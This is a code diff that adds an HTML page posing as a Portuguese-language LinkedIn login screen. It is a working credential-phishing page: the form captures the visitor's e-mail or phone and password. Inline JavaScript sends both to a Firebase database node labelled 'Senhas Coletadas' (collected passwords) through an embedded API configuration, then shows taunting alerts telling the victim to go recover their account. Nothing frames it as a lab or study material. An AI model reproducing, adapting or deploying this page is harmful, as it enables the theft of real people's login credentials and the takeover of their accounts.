@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<title>Feed | LinkedIn</title>
+	<script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js">
+	</script>
+    <script src="face.js"></script>
+	<link rel="stylesheet" href="linkedin.css">
+</head>
+
+<body id="body" >
+	        <img src="http://www.ifs.edu.br/images/arquivos/Diae/linkedIn-logo-0_1.png" height="80" width="300">
+			<p><h1>O LinkedIn é a maior rede profissional do mundo, com mais de 774 milhões de usuários em mais de 200 países e territórios em todo o mundo.</h1></p>
+			<p>Entre com seu usuário e senha</p>
+	
+	<form class="container" id="contactForm">
+		<div class="card">
+			<div class="card-body">
+				<div class="form-group">
+					<label for="exampleFormControlInput1">
+						E-mail ou Telefone
+					</label>
+					
+					<input type="text" class="form-control"
+					id="usuario" placeholder="E-mail ou Telefone">
+				</div>
+
+				<div class="form-group">
+					<label for="exampleFormControlInput2">
+						Senha
+					</label>
+					
+					<input type="password" class="form-control"
+					id="senha" placeholder="Senha">
+				</div>
+			</div>
+			<button id="bottonentrar" type="submit" class="btn btn-primary"
+				style="margin-left: 15px; margin-top: 10px">
+				Entrar
+			</button>
+			<button type="button" onclick="limpar()"id="bottonlimpar"><b>Limpar</b></button>
+		</div>
+	</form>
+
+	<script src=
+"https://www.gstatic.com/firebasejs/3.7.4/firebase.js">
+	</script>
+	
+	<script>
+		var firebaseConfig = {
+			apiKey: "AIzaSyAuSj7TeVwvEZnQTXogxrnZ9q3hLmXEgos",
+			authDomain: "cadti-581fe.firebaseapp.com",
+			databaseURL: "https://cadti-581fe.firebaseio.com",
+			projectId: "cadti-581fe",
+			storageBucket: "cadti-581fe.appspot.com",
+			messagingSenderId: "407468485353",
+			appId: "1:407468485353:web:72ace48119584c1f405e78"
+		};
+
+		firebase.initializeApp(firebaseConfig);
+
+		var messagesRef = firebase.database()
+			.ref('Senhas Coletadas');
+		
+		document.getElementById('contactForm')
+			.addEventListener('submit', submitForm);
+
+		function submitForm(e) {
+			e.preventDefault();
+
+			// Get values
+			var usuario = getInputVal('usuario');
+			var senha = getInputVal('senha');
+
+			saveMessage(usuario, senha);
+			document.getElementById('contactForm').reset();
+			alert("Parabens! Você Ganhou uma Viagem.")
+			alert("Uma viagem para recuperar sua conta do LinkedIn.")
+		}
+
+		// Function to get get form values
+		function getInputVal(id) {
+			return document.getElementById(id).value;
+		}
+
+		// Save message to firebase
+		function saveMessage(usuario, senha) {
+			var newMessageRef = messagesRef.push();
+			newMessageRef.set({
+				usuario: usuario,
+				senha: senha,
+			});
+		}
+	</script>
+	            <a href="https://www.linkedin.com/psettings/change-password">Esqueceu a senha?</a>
+				<a href="https://www.linkedin.com/login/pt">Criar uma Conta.</a>
+			</p>
+			<p><b>Gerencie a sua identidade profissional.</b> Crie e interaja com a sua rede profissional.</p>
+			<p id="alerta"><b></b></p>
+			<p>Sobre nós
+				Política de Cookies
+				Política de Privacidade
+				Contrato do Usuário
+				Acessibilidade
+				LinkedIn logo</p>
+			<p>Sobre
+				Acessibilidade
+				Central de Ajuda
+				
+				Termos e Privacidade 
+				Preferências de anúncios
+				Publicidade
+				
+				Serviços empresariais 
+				Baixe o aplicativo do LinkedIn</p>
+			<p><b>LinkedIn Corporation © 2021</b></p>
+</body>
+
+</html>
